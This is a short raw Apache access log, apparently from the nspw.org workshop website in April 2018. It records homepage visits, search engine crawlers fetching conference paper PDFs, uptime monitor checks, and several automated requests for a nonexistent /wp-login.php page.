197.206.137.40 - - [30/Apr/2018:11:52:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
175.136.63.186 - - [30/Apr/2018:11:53:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
175.136.63.186 - - [30/Apr/2018:11:53:26 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
184.105.139.67 - - [30/Apr/2018:11:53:35 -0400] "GET / HTTP/1.1" 200 11408 "-" "-"
82.251.55.231 - - [30/Apr/2018:11:53:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.251.55.231 - - [30/Apr/2018:11:53:43 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:11:54:11 -0400] "GET /cfp/nspw2016-cfp.pdf HTTP/1.1" 200 83835 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:11:54:17 -0400] "GET /2009/proceedings/2004/nspw2004-sadeghi.pdf HTTP/1.1" 200 222924 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [30/Apr/2018:11:54:34 -0400] "GET /papers/2005/nspw2005-frontmatter.pdf HTTP/1.1" 200 1584886 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:55:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
106.51.105.40 - - [30/Apr/2018:11:57:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
106.51.105.40 - - [30/Apr/2018:11:57:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.99.201.91 - - [30/Apr/2018:11:58:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.99.201.91 - - [30/Apr/2018:11:58:45 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:11:59:07 -0400] "GET /papers/2010/nspw2010-alsaleh.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:12:00:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
188.236.134.179 - - [30/Apr/2018:12:00:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.236.134.179 - - [30/Apr/2018:12:00:49 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.41.73.38 - - [30/Apr/2018:12:01:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
